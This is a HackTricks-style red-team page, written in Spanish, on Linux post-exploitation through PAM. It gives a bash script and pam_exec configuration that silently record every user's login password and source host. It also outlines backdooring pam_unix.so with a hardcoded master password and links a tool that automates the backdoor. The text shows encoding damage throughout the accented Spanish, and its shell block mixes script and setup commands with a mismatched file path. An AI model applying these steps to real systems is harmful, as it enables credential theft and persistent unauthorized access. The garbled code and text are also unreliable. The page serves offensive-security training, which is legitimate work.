# Linux Post-Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Sniffing Logon Passwords with PAM

Vamos a configurar un m贸dulo PAM para registrar cada contrase帽a que cada usuario utiliza para iniciar sesi贸n. Si no sabes qu茅 es PAM, consulta:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

**Para m谩s detalles, consulta el [post original](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. Esto es solo un resumen:

**Descripci贸n de la t茅cnica:**
Los M贸dulos de Autenticaci贸n Pluggable (PAM) ofrecen flexibilidad en la gesti贸n de la autenticaci贸n en sistemas basados en Unix. Pueden mejorar la seguridad personalizando los procesos de inicio de sesi贸n, pero tambi茅n presentan riesgos si se utilizan de manera incorrecta. Este resumen describe una t茅cnica para capturar credenciales de inicio de sesi贸n utilizando PAM, junto con estrategias de mitigaci贸n.

**Captura de credenciales:**
- Se crea un script bash llamado `toomanysecrets.sh` para registrar los intentos de inicio de sesi贸n, capturando la fecha, el nombre de usuario (`$PAM_USER`), la contrase帽a (a trav茅s de stdin) y la IP del host remoto (`$PAM_RHOST`) en `/var/log/toomanysecrets.log`.
- El script se hace ejecutable e integra en la configuraci贸n de PAM (`common-auth`) utilizando el m贸dulo `pam_exec.so` con opciones para ejecutarse en silencio y exponer el token de autenticaci贸n al script.
- El enfoque demuestra c贸mo un host Linux comprometido puede ser explotado para registrar credenciales de manera discreta.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**Para m谩s detalles, consulta el [post original](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. Esto es solo un resumen:

El M贸dulo de Autenticaci贸n Pluggable (PAM) es un sistema utilizado en Linux para la autenticaci贸n de usuarios. Opera en tres conceptos principales: **nombre de usuario**, **contrase帽a** y **servicio**. Los archivos de configuraci贸n para cada servicio se encuentran en el directorio `/etc/pam.d/`, donde las bibliotecas compartidas manejan la autenticaci贸n.

**Objetivo**: Modificar PAM para permitir la autenticaci贸n con una contrase帽a espec铆fica, eludiendo la contrase帽a real del usuario. Esto se centra particularmente en la biblioteca compartida `pam_unix.so` utilizada por el archivo `common-auth`, que es incluido por casi todos los servicios para la verificaci贸n de contrase帽as.

### Pasos para Modificar `pam_unix.so`:

1. **Localiza la Directiva de Autenticaci贸n** en el archivo `common-auth`:
- La l铆nea responsable de verificar la contrase帽a de un usuario llama a `pam_unix.so`.
2. **Modifica el C贸digo Fuente**:
- Agrega una declaraci贸n condicional en el archivo fuente `pam_unix_auth.c` que otorgue acceso si se utiliza una contrase帽a predefinida; de lo contrario, procede con el proceso de autenticaci贸n habitual.
3. **Recompila y Reemplaza** la biblioteca `pam_unix.so` modificada en el directorio apropiado.
4. **Pruebas**:
- Se concede acceso a trav茅s de varios servicios (login, ssh, sudo, su, screensaver) con la contrase帽a predefinida, mientras que los procesos de autenticaci贸n normales permanecen sin afectar.

{% hint style="info" %}
Puedes automatizar este proceso con [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
